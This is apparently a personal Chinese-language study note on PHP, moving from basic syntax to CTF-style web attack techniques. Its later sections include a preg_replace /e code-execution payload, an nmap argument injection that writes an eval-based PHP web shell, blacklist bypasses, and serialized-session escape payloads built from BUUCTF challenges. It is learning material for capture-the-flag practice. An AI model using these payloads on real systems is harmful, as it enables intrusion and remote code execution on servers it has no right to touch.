---
title: Basic_PHP
categories:
- Front end
- PHP
tags:
- PHP
date: 2024-05-16 16:26:44
---

# PHP 的补充知识点

## 1. 说明

1. 以菜鸟教程以及其评论为主要教材，文章主要进行知识点的补充。

    > https://www.runoob.com/php/php-tutorial.html

## 2. 知识点正文

1. `<?php` 也可以是 `<?=`。

### 2.1 字符串

1. 双引号内可以识别变量，单引号不行：
    ```php
    <?php
    $a = "我是傻逼";
    echo "你是谁？$a"
    ?>
    ```

2. 获取变量类型，除了 `var_dump()`，还有 `gettype()`，实际中使用 `gettype()` 多，因为 `var_dump()` 除了打印数据类型，还会将内容打印，因此其一般用于调试中。

### 2.2 数组

1. `foreach` 遍历关联数组，如果没有 `as` ，则默认获取的是 value：

    ```php
    <?php
    $age=array("Peter"=>"35","Ben"=>"37","Joe"=>"43");
     
    foreach($age as $x)
    {
        echo "value = " . $x;
        echo "<br>";
    }
    ?>
    ```
    
2. 数组在创建的时候自带一个指针，因此可以直接对数组使用 `next()` 函数，详见：[GXYCTF2019]禁止套娃 1。

### 2.3 函数

1. 严格模式，严格规定函数的参数类型。
    ```php
    <?php
    declare(strict_types= 1);
    function plus(int $a, int $b) {
      return $a + $b;
    }
    ?>
    ```

    只要传不同的类型就会报错，不会进行类型转换

2. `global` 关键字和 `static` 关键字。
    `global` 关键字用于函数内部使用全局变量时，需要用 `global` 关键字注明函数内使用的变量是全局变量。
    `static` 修饰的局部变量不会被删除，其值会延续。（不常用）

3. 可以使用 `unset(变量)` 来删除一个变量。但是在局部作用域中，无法删除全局变量。

### 2.4 数组运算符

1. `+` 相同的键不覆盖，如果想要覆盖，采用函数 `array_merge(数组1, ...)`

### 2.5 特殊变量 - 可变变量写法

1. 多个 `$` 的情况：
    ```php
    <?php
        $a = 'test1';
    	$$a = 'test2';
    	$$$a = 'test3';
    	echo $a . "\n"; // 输出 test1
    	echo $test1 . "\n"; // 输出 test2
    	echo $test2 . "\n"; // 输出 test3
    ?>
    ```

2. 对于数组，为了使用数组的可变变量名，需要解决一个歧义问题。如果你写 `$$a[1]`，解析器需要明白究竟你的意思是要把 `$a[1]` 当成一个变量，还是要把 `$$a` 当成变量、这时 `[1]` 指的是这个变量的索引。解决这个歧义问题的语法是：第一种情况使用`${$a[1]}`，第二种情况使用`${$a}[1]`。

3. 如果是 `${function()}`，如果函数有返回值，那么就会变成 `${返回值}`，即 `$返回值`：
    ![image-20240516162629708](PHP/image-20240516162629708.png)

### 2.6 文件包含

1. `include_once` 和 `require_once` 表示只会引入一次。文件包含的实质就是直接将其他的 PHP 文件内容复制粘贴过来。使用 `_once` 可以避免重复定义问题。 
2. 一般引入公共函数、库时用 `_once` 。

## 3. 常用的一些危险函数

### 3.1 打印相关

#### 3.1.1 `print_r()`、`var_dump()` 和 `var_export()`

1. 这三个都是打印一个变量的内容。

2. 官方的定义：

    > **print_r()** displays information about a variable in a way that's readable by humans.
    > var_dump — Dumps information about a variable. This function displays structured information about one or more expressions that includes its type and value. Arrays and objects are explored recursively with values indented to show structure.
    > **var_export()** gets structured information about the given variable. It is similar to [var_dump()](https://www.php.net/manual/en/function.var-dump.php) with one exception: the returned representation is valid PHP code.

#### 3.1.2 `file_get_content()` 和 `highlight_file()`

1. 这两个都是用来打印文件内容的。
2. `file_get_content()` 返回的结果是 `string`，失败则返回 `false`。
3. `highlight_file()` 就是彩色返回内容。
4. `file_get_content()` 接收的变量的内容如果外部可控（例如通过 GET），这时需要借助**文件相关的伪协议以传入文件流**，例如 `file` 或者 `data` 伪协议，普通的 `str` 会报错。

### 3.2 文件和文件夹相关操作

#### 3.2.1 `scandir()`

1. 官方解释：

    > Returns an [array](https://www.php.net/manual/en/language.types.array.php) of files and directories from the `directory`.

2. 注意返回结果是 `array`，因此看后续结果就需要借助[变量打印函数。](# 3.1.1 `print_r()`、`var_dump()` 和 `var_export()`)

### 3.3 编码和特殊字符绕过函数

#### 3.3.1 `chr()`

1. 官方解释：

    > This can be used to create a one-character string in a single-byte encoding such as **ASCII, ISO-8859, or Windows 1252**

2. 一般直接输入一个字符的十进制 ASCII 就行。

3. 这个方法就可以绕过一些代码层面上的过滤。

### 3.4 返回值为特殊字符或自定义输入的函数

#### 3.4.1 `localeconv()`

1. 这个函数返回值是一个数组，第一个元素的内容是 `.`；所以可以用于返回一些路径函数，例如 `scandir(current(localeconv))`。

#### 3.4.2 http 头部相关的函数

1. 详见文章：

    > https://blog.csdn.net/Manuffer/article/details/120738755

## 4. PHP 的一些危险特征（和序列化相关的详见 PHP 的序列化部分）

### 4.1 字符串解析特征绕过 waf

1. 直接上图
    ![66.png](PHP/66.png)

2. 文章参考：

    > https://nosec.org/home/detail/2759.html

3. 以后有机会再验证图片的真实性吧。

### 4.2 PHP 中 MD5 的常见绕过

1. 别人总结的挺好，这里就直接粘贴了，个人补充一下细节：

    > https://blog.csdn.net/iczfy585/article/details/106081299
    > https://blog.csdn.net/CSDNiamcoming/article/details/108837347

2. 有关第一点的 16 进制数，PHP 对其进行 MD5 的 16 进制加密后，生成的实际是 含 16 进制数的字符串。至于后续解析成看得懂的字符的过程，实际上是 MySQL 在操作。在字符串上下文，十六进制字符串中的每一对十六进制数字会根据十六进制的 ASCII 表，被转换成一个字符。

3. PHP 中，GET 或者 POST 所传递的变量的内容，可以是数组。也就是 PHP 的数组语法。

### 4.3 针对黑名单函数的绕过

1. 某些题目会通过黑名单来限制传入函数，如果只是通过大小写来保证过滤，那么就有绕过的可能。
2. 方法一：PHP 在方法前添加 `\`，用来表示**在当前命名空间内调用全局的方法**。因此可以通过在方法前加 `\` 来绕过黑名单。例如 `\system()`。
3. 方法二：和一类似，通过添加 `@`，表示抑制报错信息。
4. 例题：[网鼎杯 2020 朱雀组]phpweb 1（该题本意是反序列化）。

### 4.4 `preg_replace()` 的 `e` 模式导致的漏洞

1. 简单介绍一下 `preg_replace()`：
    `preg_replace(正则表达式, 替换的字符串 replacement, 被替换的目标字符串 subject)`

2. PHP 中有一个特殊的匹配模式，即 `e` 模式，即 正则表达式为 `/表达式/e`。这个模式 PHP 专有且只用于 `preg_replace()`。该模式表示会将 `replacement` 中的内容当作 PHP 的代码执行，如果 `replacement` 可控，那么就可以执行漏洞。

3. 一般情况下，`replacement` 内容往往是固定的，但是如果在正则中的“反向引用”，则有可利用的情况。

4. 直接上例子：[BJDCTF2020]ZJCTF，不过如此 1。涉及漏洞的代码如下：
    ```php
    <?php
    // re 为 get 的 key，str 为 get 的 value
    function complex($re, $str) {
        return preg_replace(
            '/(' . $re . ')/ei',
            'strtolower("\\1")',
            $str
        );
    }
    
    foreach($_GET as $re => $str) {
        echo complex($re, $str). "\n";
    }
    
    function getFlag(){
    	@eval($_GET['cmd']);
    }
    ```

5. 注意这里的 `replacement` 为 `"\\1"` 且正则表达式中有 `()`。

    > 对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 **\n** 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。
    >
    > 可以使用非捕获元字符 **?:**、**?=** 或 **?!** 来重写捕获，忽略对相关匹配的保存。
    >
    > 反向引用的最简单的、最有用的应用之一，是提供查找文本中两个相同的相邻单词的匹配项的能力。以下面的句子为例：
    >
    > ```
    > Is is the cost of of gasoline going up up?
    > ```
    >
    > 上面的句子很显然有多个重复的单词。如果能设计一种方法定位该句子，而不必查找每个单词的重复出现，那该有多好。

    简单来说，`()` 用于确定分组，而 `\number` 来捕获特定分组的内容。

6. 以这题的 EXP 为例：
    `next.php?\S*=${phpinfo()}`。
    传入后是 `preg_replace('/(\S*)/ei', 'strtolower("\S* 所匹配的内容")', '${phpinfo()}')`。
    根据正则表达式，这里 `replacement` 就是 `strtolower("${phpinfo()}")`。至于里面的内容为什么会被执行，是因为双引号内的变量会解析；然后就是[特殊变量 - 可变变量](#2.5 特殊变量 - 可变变量写法)的知识点，`phpinfo()` 被执行，函数的返回值会被当成变量名。

### 4.5 Linux 下 `escapeshellarg()` 和 `escapeshellcmd()` 先后套用造成的 RCE

1. 先介绍 `escapeshellarg()`：

    > 摘自官网：
    > **escapeshellarg()** 将给字符串**增加一个单引号**并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含[exec()](https://www.php.net/manual/zh/function.exec.php)、[system()](https://www.php.net/manual/zh/function.system.php) 和[执行运算符](https://www.php.net/manual/zh/language.operators.execution.php) 。
    > **在 Windows 上**，**escapeshellarg()** 用空格替换了百分号、感叹号（延迟变量替换）和双引号，**并在字符串两边加上双引号**。此外，每条连续的反斜线(`\`)都**会被一个额外的反斜线**所转义。

2. 再来看 `escapeshellcmd()`：

    > 摘自官网：
    > **escapeshellcmd()** 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 [exec()](https://www.php.net/manual/zh/function.exec.php) 或 [system()](https://www.php.net/manual/zh/function.system.php) 函数，或者 [执行操作符](https://www.php.net/manual/zh/language.operators.execution.php) 之前进行转义。
    > 反斜线（\）会在以下字符之前插入：`&#;`|*?~<>^()[]{}$\`、`\x0A` 和 `\xFF`。 `'` 和 `"` **仅在不配对**的时候被转义。**在 Windows 平台**上，所有这些字符以及 `%` 和 `!` 字符前面都有一个插入符号（`^`）。

3. 由于 Windows 上 `escapeshellarg()` 有特殊处理，这里以 Linux 平台为主，测试可以用在线的 PHP 工具：https://www.jyshare.com/compile/1/。
    以字符串 `x'y` 为例，经过 `escapeshellarg()`后的结果为：
    `'x'\''y'`，详细来讲，先给中间的 `'` 添加 `'\'` 用来转义，接着在两边添加单引号用于连接。
    再经过 `escapeshellcmd()` 后的结果为：
    `'x'\\''y\'`，详细来讲，就是 `'x'\''y'` 的 `\` 前直接添加 `\` 来转义，末尾的 `'` 是多出来的，还要添加 `\` 来转义。
    在线网站跑出的结果如下：
    ![image-20240517142528136](PHP/image-20240517142528136.png)
    注意 `var_dump()` 显示的时候外面有一对双引号。

4. 假如一段 Shell 命令的参数可控，例如：[BUUCTF 2018]Online Tool 1
    ```php
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
    ```

    这时假设输入：`'<?php @eval($_POST[1]);?> -oG 123.php'`，最终的结果其实是：
    `''\\''\<\?php @eval\(\$_POST\[1\]\)\;\?\> -oG 123.php'\\'''`。
    ![image-20240517143000920](PHP/image-20240517143000920.png)

    结合前面的命令，在 Linux 中就是（无用的成对单引号已经去掉）：
    `-F \\\<\?php @eval\(\$_POST\[1\]\)\;\?\> -oG 123.php'\\'`。
    由于 Linux 中反斜杠具有转义的功能，因此特殊符号原本在 Linux 中的特殊含义反而全被“消去”，变成普通的字符。最终执行命令也就是（特殊字符没有了特殊含义）：
    `-F \<?php @eval($_POST[1]);?> -oG 123.php\\`。也就是 `\<?php @eval($_POST[1]);?>` 写入了文件名为 `123.php\\` 的文件当中。
    但是这个文件名访问不到，而且前面 `<` 紧贴一个 `\` 会造成程序报错，因此最终的 payload 前后还要带个空格，即：
    ` ' <?php @eval($_POST[1]);?> -oG 123.php '`。

### 4.6 `intval()` 解析差异

1. 参考文章：

    > https://blog.csdn.net/qq_44879989/article/details/133418606

2. 重点在于低版本下，`intval()` 对科学计数法的解析有问题，导致科学计数失效。

3. 其他类型有关 `intval()` 的绕过：

    > https://blog.csdn.net/wangyuxiang946/article/details/131156104

4. 例题：[WUSTCTF2020]朴实无华 1

### 4.7 变量覆盖

1. 很小的知识点，知道两个函数就行。
2. `unset($变量)` 会将变量销毁。
3. `extract($_GET|$_POST)`，会从 GET 和 POST 中将同名变量的值覆盖掉，例如传 `cmd=calc` 就会将 PHP 中变量 `$cmd` 的内容变成 `calc`。

### 4.8 反序列化逃逸

1. 序列化后能**成功序列化的字符串**的**长度是固定的**，后面多余的部分会被直接截断。

2. 题目经常会对序列化后的敏感内容进行过滤，以 [安洵杯 2019]easy_serialize_php 1 为例，其过滤函数就是：
    ```php
    function filter($img){
        $filter_arr = array('php','flag','php5','php4','fl1g');
        $filter = '/'.implode('|',$filter_arr).'/i';
        return preg_replace($filter,'',$img);
    }
    $serialize_info = filter(serialize($_SESSION));
    ```

3. 个人认为，这种逃逸的题目的两个关键是：

    1. 序列化格式被破坏。
    2. 长度被破坏。

#### 4.8.1 字符减少的情况 - 以 [安洵杯 2019]easy_serialize_php 1 为例

1. 题目代码：
    ```php
     <?php
    
    $function = @$_GET['f'];
    
    function filter($img){
        $filter_arr = array('php','flag','php5','php4','fl1g');
        $filter = '/'.implode('|',$filter_arr).'/i';
        return preg_replace($filter,'',$img);
    }
    
    
    if($_SESSION){
        unset($_SESSION);
    }
    
    $_SESSION["user"] = 'guest';
    $_SESSION['function'] = $function;
    
    extract($_POST);
    
    if(!$function){
        echo '<a href="index.php?f=highlight_file">source_code</a>';
    }
    
    if(!$_GET['img_path']){
        $_SESSION['img'] = base64_encode('guest_img.png');
    }else{
        $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
    }
    
    $serialize_info = filter(serialize($_SESSION));
    
    if($function == 'highlight_file'){
        highlight_file('index.php');
    }else if($function == 'phpinfo'){
        eval('phpinfo();'); //maybe you can find something in here!
    }else if($function == 'show_image'){
        $userinfo = unserialize($serialize_info);
        echo file_get_contents(base64_decode($userinfo['img']));
    } 
    ```

2. 序列化格式被破坏 - 表现为吞掉[键的所有和]值的序列化前缀（以后都叫前缀）。
    具体来说，就是在字符减少的情况下，原先的序列化格式遭到破坏，例如以本题的过滤函数为例，序列化数据（一对键值对） `s:7:"flagphp";s:3:"***";` 就会变成 `s:7:"";s:3:"***";`。此时键的长度和指定的长度不匹配，必然会报错。
    因此，为了保证结构不被破坏，那其必然会向后寻找字符作为键的内容，例如这时假如序列化数据正确的话，那么键的内容就变成了 `";s:3:"` 共 7 个字符。显然其值的（序列化）前缀被吞掉。上述是键内容逃逸，当然也可以让值内容逃逸。

3. 键的内容逃逸：

    1. 键的内容被过滤后，必然会向后吞掉其值的前缀。因此要额外构造一个值供该键匹配。
    2. 例如本题，想要构造的内容大概是：
        `a:2:{s:4:"flag";s:xx:";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`。
        其中的一对用户可输入的键值对是 `flag => ;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`，如果长度对的情况下，后面的 `";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`就会被截断。
        这里的 xx 表示长度，预估输入的内容的长度是两位数。
    3. 分析一下，其吞掉的内容应该是 `";s:xx:`，这样后面的 `;s:3:"img"...` 才能符合序列化的结果以被解析，且双引号正好闭合键的内容；因此吞掉的空间，也就是空位是 7 个字符。
    4. 所以我们要空出 7 个空间，因此输入的键的内容是 `flagphp`。
    5. 接着看，吞掉后，前面 `flagphp` 的值没了，其后面的 `img` 是键，不能作为其的值，不然键值数量不匹配（一个键值对，一个单独的键），所以要为 `flagphp` 创建一个值。
    6. 这里需要注意的是，被截断部分的开头是有个双引号的，这个双引号是序列化时生成的，我们要把他截掉，那么原先的长度肯定是包含他的，现在要截取他，因此我们空出的空间实际上就是 7 + 1 = 8 个。因此构造出来的值要占据 8 个空间，所以可以构造 `;s:1:"1"`，长度恰好为 8，把他塞入 `img` 的前面，就可以作为 `flagphp` 的值了。
    7. 所以 payload 为：
        `_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`。

4. 值的内容逃逸

    1. 相比键的内容逃逸，值的内容逃逸将下一个键值对的**键和值的前缀**（输入的内容为下一个键值对的值的内容）和一个双引号一起消耗（两种情况总之要把想覆盖内容的键值对的**前面都给变成前一对键值对的键或值的内容**），那序列化时就要补一个键值对，所以相比键构造就要**多一个键值对**。
    2. 例如我们想构造：
        `a:3:{s:1:"a";s:xx:"被消去的内容";s:1:"b";s:xx:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`。
        其中 xx 依旧表示我们带输入内容的长度，预估不会超过两位数。
    3. 同样的，`a` 的值内容应该是 `";s:1:"b";s:xx:"`，这样才能保证 `img` 作为键有效。可以看出，需要至少 15 个空位（至少是因为 "b" 可以变长）。
    4. 因此前面还是腾出 15 个空位，末尾需要补充一个键值对以保证键值对的数量对上，同时长度还要对上。因此需要长度为 16 的一个键值对（别忘了结尾有个双引号要截断，从而腾出一个空位）。所以构造 `s:1:"1";s:1:"1";`，这样就填上了空位。
    5. 所以最终的 payload 可以是：
        `_SESSION[a]=flagflagflagphp&_SESSION[b]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"1";}`。

5. 上述内容忽略了一个情况：那就是 `img` 的内容编码后长度一致，恰巧都是 20 个字符。假设新的长度是 20+ 而不是 20，那么在假定空位固定的情况下，其会被占掉一部分。以键的内容逃逸为例，如果长度为 23，那么原本的空位为 7，多出来 3 个字符占空位，那么导致构造出来的值的长度就是 7 - 3 + 1 = 5，那么此时构造的值的内容就是 `;i:11`。同样的，如果缩短，那么空位就会多出来，值的长度就要增加。
